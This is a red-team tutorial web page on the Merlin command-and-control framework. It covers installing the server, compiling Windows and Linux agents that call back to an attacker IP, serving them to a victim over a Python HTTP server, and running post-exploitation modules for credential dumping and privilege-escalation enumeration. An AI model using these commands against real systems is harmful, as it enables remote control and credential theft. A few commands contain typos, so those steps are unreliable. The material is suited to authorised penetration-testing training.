<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Command and Control Guide to Merlin</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-and-control-guide-to-merlin/" rel="bookmark"><time class="entry-date published" datetime="2019-03-12T09:12:27+00:00">March 12, 2019</time><time class="updated" datetime="2025-05-13T11:08:19+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we learn how to use Merlin C2 tool. It is developed by <strong>Russel Van Tuyl </strong>in Go language.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction</span></li>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Windows exploitation</span></li>
<li><span style="color: #000000;">Windows post exploitation</span></li>
<li><span style="color: #000000;">Linux exploitation</span></li>
<li><span style="color: #000000;">Linux post exploitation</span></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">Merlin is a great cross-platform Command and control tool written in the Go language. Two elements make it up, i.e., the server and agent. It operates on the HTTP/2 protocol. The best things about Merlin are that it compiles to work on any platform and that you can even build it from source. Normally, we put agents on Windows and listen on Linux, but because developers wrote it in Go language, Merlin allows us to place agents on any platform/machine we encounter, and we can listen to it on any platform as well. This is much more successful than others when it comes to red teaming as it makes IDS/IPS struggle to identify it.</span></p>
<p><span style="color: #000000;">Run the Merlin server in the folder where agents can call out to it. By default, configure the server on 127.0.0.1:443, but you can change it to your own IP. As discussed earlier, you can cross-compile the merlin agent to run on any platform. Use the Merlin server to interact with agents. Execute any binary file with the target’s path variable.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Installation</span></span></h3>
<p><span style="color: #000000;">Merlin’s installation is pretty tricky. The most convenient way to download is shown in this article. Installing Go language is compulsory in order for Merlin to work. So, to install the Go language type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install golang</pre>
<p><span style="color: #000000;">And then to install merlin the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /opt/merlin;cd /opt/merlin
wget //github.com/Ne0nd0g/merlin/releases/download/v0.1.4/merlinServer-Linux-x64-v0.1.4.7z</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-OlBodaw85iQ/XIdvehF4LmI/AAAAAAAAdbo/kSUaiHq1_305b_nanGAnPKZhn9iOogQlgCLcBGAs/s1600/1.png" border="0" data-original-height="573" data-original-width="921"/></p>
<p><span style="color: #000000;">Once the above commands are executed successfully, use the following command to unzip merlin server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">7z x merlinServer-Linux-x64-v0.1.4.7z</pre>
<p><img fetchpriority="high" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-cGWOrVZhfCU/XIdvggDU6nI/AAAAAAAAdcI/8_1mCvlkgE823tdvdLHSPs3JKZBu9le6ACLcBGAs/s1600/2.png" alt="Merlin Command and Control Guide" width="918" height="545" border="0" data-original-height="545" data-original-width="918"/></p>
<p><span style="color: #000000;">Now, after unzipping, when you use ls command; you will find the merlin server and readme file. We can check if the server is running by using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./merlinServer-Linux-x64</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-hKNC9fERFFI/XIdvipF70-I/AAAAAAAAdco/alOHzwUAbZkjNyoQvzMg_j5sqSVoEBuZACLcBGAs/s1600/3.png" border="0" data-original-height="637" data-original-width="720"/></p>
<h4><span style="color: #000000;">Configuring the GOPATH and Running Merlin</span></h4>
<p><span style="color: #000000;">In “README.MD”, we find the instructions for installing “Merlin” in our system.</span></p>
<p><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-x0vnvQYfilU/XIdw5Y4gY9I/AAAAAAAAdeg/YyojHeoMOkgKrf2TE41HGqXov532hfowwCLcBGAs/s1600/4.png" alt="Merlin Command and Control Guide" width="740" height="577" border="0" data-original-height="577" data-original-width="740"/></p>
<p><span style="color: #000000;">Now according to the readme file, we have to setup GOPATH environment variable for the installation and then install merlin using “go” instead of git clone. So, to complete these steps run the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "export GOPATH=$HOME/go" &gt;&gt; .bashrc
source .bashrc
go get github.com/Ne0nD0g/merlin</pre>
<p><span style="color: #000000;">Once the directory is downloaded, let’s check its contents using cd and ls commands.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-4AQLmCupt5s/XIdw5bARGII/AAAAAAAAdek/gUU0voFqs901z6are9mrKCUyzOVSFwQhQCLcBGAs/s1600/5.png" border="0" data-original-height="149" data-original-width="831"/></p>
<p><span style="color: #000000;">There was a cmd directory, and in it, there was a directory named merlinserver where we found main.go. Run main.go as shown in the image below :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">go run main.go</pre>
<p><img decoding="async" class="alignnone" src="//1.bp.blogspot.com/-ZuAVTqpA_UQ/XIdw59VAKlI/AAAAAAAAdeo/5qGGEwz-EsEHyVB6nWEQXUYIlwWaJB15wCLcBGAs/s1600/6.png" alt="Merlin Command and Control Guide" width="920" height="868" border="0" data-original-height="868" data-original-width="920"/></p>
<h4><span style="color: #000000;">Setting Up the SSL Certificate</span></h4>
<p><span style="color: #000000;">As you can see the tool merlin is still not running properly as there is no SSL certificate given to it. If you navigate through the /opt/merlin directory, you will find a directory named data in which there is an SSL certificate. Copy the data folder into the merlinserver directory as shown in the image below:</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-6nFk4qvFjew/XIdw50vWsQI/AAAAAAAAdes/zcYzdyxiRqYzVZBPC5v5lm1REmr30g3QwCLcBGAs/s1600/7.png" border="0" data-original-height="222" data-original-width="872"/></p>
<p><span style="color: #000000;">Now if you run merlin using the command: <strong>go run main.go</strong>, merlin server will run successfully.</span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-Vfh4YaQTIFM/XIdw6E-pHtI/AAAAAAAAdew/9jqXvFK3AucCyyS1vF73bwJlVwEEaVaHgCLcBGAs/s1600/8.png" border="0" data-original-height="668" data-original-width="806"/></p>
<p><span style="color: #000000;">Now using the following help command you can see, as shown in the image, the arguments that you can use to run your commands as desired:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">go run main.go -h</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-j5TYsnldQ6o/XIdw67HrYQI/AAAAAAAAde0/ATmEJa-jn6IrMzWWaa8DKfvD3BFcgD2rgCLcBGAs/s1600/9.png" alt="Merlin Command and Control Guide" width="919" height="419" border="0" data-original-height="419" data-original-width="919"/></p>
<h3><span style="color: #800000;">Windows Exploitation</span></h3>
<p><span style="color: #000000;">Now, to make Merlin agent for windows type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">GOOS=windows GOARCH=amd64 go build -ldlags "-X main.url=//192.168.0.11:443" -o shell.exe main.go</pre>
<p><span style="color: #000000;">Now, share the shell with the target using the python server:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-CYOfMgPcJ0A/XIdwyHuhkSI/AAAAAAAAddY/g_rTf3RO68ghU43_vaiV09ZZyXe1TliqQCLcBGAs/s1600/10.png" border="0" data-original-height="110" data-original-width="894"/></p>
<p><span style="color: #000000;">In order to create a listener for the shell to revert, use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">go run main.go -i 192.168.0.11</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-nhufYWFhnoI/XIdwyJw-AGI/AAAAAAAAddc/TGeUG7TdQks21of99ehorb-sOSMwrxhxACLcBGAs/s1600/12.png" alt="Merlin Command and Control Guide" width="873" height="681" border="0" data-original-height="681" data-original-width="873"/></p>
<p><span style="color: #000000;">And just like that, you will have your session as shown in the image above. Now, use the help command to see all the options as shown in the image given below:</span></p>
<p><img decoding="async" src="//3.bp.blogspot.com/-So55jRusNqk/XIdwyzI-1jI/AAAAAAAAddg/46FNLODYyKwz02T6w469efZngs6TEA7MACLcBGAs/s1600/13.png" border="0" data-original-height="517" data-original-width="891"/></p>
<p><span style="color: #000000;">Type <strong>sessions</strong> to see the list of the sessions you acquire as shown in the image below:</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-7alRGs1oT_g/XIdwzCIzkVI/AAAAAAAAddo/MD9f-j29H4kGIMrRORgCmMXB-D2fIiznQCLcBGAs/s1600/14.png" alt="Merlin Command and Control Guide" width="1089" height="169" border="0" data-original-height="169" data-original-width="1089"/></p>
<p><span style="color: #000000;">To access than an available session uses the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-Dk1ZYsifN2E/XIdwzMTZDoI/AAAAAAAAddk/hnkeu9b1kdgyv-zNBP99snV1XQQUfjWlQCLcBGAs/s1600/15.png" border="0" data-original-height="568" data-original-width="770"/></p>
<p><span style="color: #000000;">As you have accessed the session, here you can use windows commands such as:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell ipconfig</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-6rSaiYggKYw/XIdwzp0c2QI/AAAAAAAAdds/AdH6RAF2BWgtXT3c_enJ6rX_x0l8cxb0wCLcBGAs/s1600/16.png" alt="Merlin Command and Control Guide" width="769" height="365" border="0" data-original-height="365" data-original-width="769"/></p>
<p><span style="color: #000000;">Then further you can use various post exploitation modules, list of which are shown in the image below:</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-1mLNUe85h-8/XIdw0CRxaLI/AAAAAAAAddw/tdLC2kSOLs4c4GfKvyeIgYOgHhsyG3jvACLcBGAs/s1600/17.png" border="0" data-original-height="347" data-original-width="678"/></p>
<h3><span style="color: #800000;">Windows Post Exploitation</span></h3>
<p><span style="color: #000000;">We will be using a module here to dump the credentials of windows and to activate the said post exploitation module type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use module windows/x64/powershell/credentials/dumpCredStore</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-7C6ZkII0iU0/XIdw0oFDh3I/AAAAAAAAdd0/q6IT59NWWP0IycnyiWHFzVr129CDFaGXwCLcBGAs/s1600/18.png" alt="Merlin Command and Control Guide" width="921" height="476" border="0" data-original-height="476" data-original-width="921"/></p>
<p><span style="color: #000000;">As you can see in the image above that info commands gives us all the details about the module including the options that we need to specify in the module. So, therefore, let’s set the options:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set agent &lt;agent name&gt;
run</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-GsNqEVtYcHs/XIdw1DleFzI/AAAAAAAAdd4/WHTAaw3pHnkMtLTZ1FA_qeVsaPVrbqCoACLcBGAs/s1600/19.png" border="0" data-original-height="743" data-original-width="805"/></p>
<h3><span style="color: #800000;">Linux Exploitation</span></h3>
<p><span style="color: #000000;">Now, we will make a merlin agent for Linux machine. For this, simply type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Export GOOS=linux;export GOARCH=amd64; go build -ldflags "-s -w -X main.url=//192.168.0.11:443" -o shell.elf main.go</pre>
<p><span style="color: #000000;">Once the command is executed, your malware will be created. Use the python to share the file with the victim as shown in the image below or however see it fit. For starting python HTTP server:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-VGAr3dnPm0o/XIdw1xpFLyI/AAAAAAAAdeA/ID1E9QcnCtca1Pk8J3hLaYix-z_UVsKBQCLcBGAs/s1600/20.png" alt="Merlin Command and Control Guide" width="849" height="110" border="0" data-original-height="110" data-original-width="849"/></p>
<p><span style="color: #000000;">Setup the listener and wait for the file to get executed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">go run main.go -I 192.168.0.11</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-Ooxrg5H6X8I/XIdw1ysnAtI/AAAAAAAAdeE/jX68Auv0k98gIqp7rHsjmvBOV8_tzKL5ACLcBGAs/s1600/22.png" border="0" data-original-height="726" data-original-width="874"/></p>
<p><span style="color: #000000;">And as shown in the image above, you will have your session. Then type sessions to see the list of sessions gained.</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-lRp5wx27rcU/XIdw2kg01LI/AAAAAAAAdeI/QQrmwDojVbU44Vke9RpxiF4nTNiNzMRqgCLcBGAs/s1600/23.png" alt="Merlin Command and Control Guide" width="900" height="167" border="0" data-original-height="167" data-original-width="900"/></p>
<p><span style="color: #000000;">To access the session use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-YZoVuOf2gy4/XIdw3ER35cI/AAAAAAAAdeM/Rk_uXLCqVzAvG1qqzQBqB5g7tV0PpK4agCLcBGAs/s1600/24.png" border="0" data-original-height="546" data-original-width="673"/></p>
<p><span style="color: #000000;">Then further you can use any Linux command such as:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell ls</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-y22di9bTdog/XIdw3i1OdoI/AAAAAAAAdeQ/b28VL0MZcjIOzpWE619KEoxePBLhP-fIACLcBGAs/s1600/25.png" alt="Merlin Command and Control Guide" width="748" height="255" border="0" data-original-height="256" data-original-width="748"/></p>
<h3><span style="color: #800000;">Linux Post Exploitation</span></h3>
<p><span style="color: #000000;">Even in Linux, you can further use a number of post-exploitation modules. The one we will be using in this article is privesc/LinEnum:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use module linux/x64/bash/priesc/LinEnum</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-0Qd2HAOJvfE/XIdw4P6DmGI/AAAAAAAAdeU/wz9Hc9_7NEcCqTU6lak3AIBwmIMqc9fbACLcBGAs/s1600/26.png" border="0" data-original-height="526" data-original-width="877"/></p>
<p><span style="color: #000000;">Through info command, we know that we have to give a session in order to run this module. So, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set agent &lt;session name&gt;
run</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-vOYBM0XwBi8/XIdw4yR9B7I/AAAAAAAAdeY/izTmymjG6YEXgUJvYqd12-NjF4ZSBUF2wCLcBGAs/s1600/27.png" alt="Merlin Command and Control Guide" width="931" height="282" border="0" data-original-height="282" data-original-width="931"/></p>
<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
<p><span style="color: #000000;">And this way your module will run. Try and work with Merlin c2 tool as its one of best and as you can see how convenient it is crossed-platformed.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast</span><strong><span style="color: #000000;">. Contact</span> <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
